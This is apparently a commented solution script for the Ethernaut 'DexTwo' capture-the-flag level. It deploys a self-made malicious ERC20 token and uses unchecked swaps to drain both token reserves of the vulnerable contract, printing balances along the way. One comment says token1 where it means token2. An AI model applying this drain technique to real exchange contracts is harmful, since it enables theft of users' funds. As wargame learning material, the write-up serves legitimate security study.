let token1 = await contract.token1();
let token2 = await contract.token2();

// Looking at the DexTwo contract code carefully, we see that the swap() method
//  no longer has a require() statement that we see in the original Dex
//  contract

// The original contract had a require() statement that stated that the from
//  and to tokens passed as parameters to the swap method had to be either
//  Token A or Token B

// Now that we can swap any tokens for Token A or Token B, we can create our
//  own ERC20 token and use it to drain the DexTwo contract of all its
//  reserves of Token A and Token B

// So we create a MaliciousToken, deploy via Remix IDE, and note the contract
//  address

// Then we do our swapping like we did in the previous level

// first approve the Dex to spend our MaliciousTokens
let malToken = web3.utils.toChecksumAddress(
    "0xd4cf72184d1f155c5b86aeee0971fe06aa15e82c"
);

let payload_approve = web3.eth.abi.encodeFunctionCall(
    {
        name: "approve",
        type: "function",
        inputs: [
            {
                type: "address",
                name: "owner",
            },
            {
                type: "address",
                name: "spender",
            },
            {
                type: "uint256",
                name: "amount",
            },
        ],
    },
    [player, instance, 1000000]
);

web3.eth.sendTransaction({ from: player, to: malToken, data: payload_approve });

// Now, we need to work out how many MaliciousTokens we should give the DexTwo
//  contract so that we can drain it

// Let's start with token1:
//  - DexTwo has 100 of token1 to start, and 0 of MaliciousToken
//  - Suppose we want to trade 1 MAL for token1
//  - Then, the swap price is (1 * 100) / M (where M is the reserves of MAL)
//  - So, we can drain DexTwo of token1 in one call by transferring 1 MAL
//     => swap price = (1 * 100) / 1 = 100
//     => so we'd get 100 token1 for 1 MAL

// transfer 1 MAL
let payload_transfer = web3.eth.abi.encodeFunctionCall(
    {
        name: "transfer",
        type: "function",
        inputs: [
            {
                type: "address",
                name: "to",
            },
            {
                type: "uint256",
                name: "amount",
            },
        ],
    },
    [instance, 1]
);

web3.eth.sendTransaction({
    from: player,
    to: malToken,
    data: payload_transfer,
});

(await contract.balanceOf(malToken, instance)).toString();
// >> returns 1

(await contract.balanceOf(token1, instance)).toString();
// >> returns 100

// swap 1 MAL for token1
await contract.swap(malToken, token1, 1);

(await contract.balanceOf(malToken, instance)).toString();
// >> returns 2

(await contract.balanceOf(token1, instance)).toString();
// >> returns 0

(await contract.balanceOf(token1, player)).toString();
// >> returns 110

// So we've successfully drained DexTwo of token1

// Now let's do token2:
//  - DexTwo has 100 of token2 to start, and 2 of MaliciousToken
//  - Suppose we want to trade 1 MAL for token2
//  - Then, the swap price is (1 * 100) / 2 = 50 (where M is the reserves of
//    MAL), so we can get 50 token2 for 1 MAL
//  - So, we can drain DexTwo of token2 in one call by transferring 2 MAL
//     => swap price = (2 * 100) / 2 = 100
//     => so we'd get 100 token1 for 2 MAL

(await contract.balanceOf(token2, instance)).toString();
// >> returns 100

// swap 2 MAL for token2
await contract.swap(malToken, token2, 2);

(await contract.balanceOf(malToken, instance)).toString();
// >> returns 4

(await contract.balanceOf(token2, instance)).toString();
// >> returns 0

(await contract.balanceOf(token2, player)).toString();
// >> returns 110

// So we've successfully drained DexTwo of token2

// submit
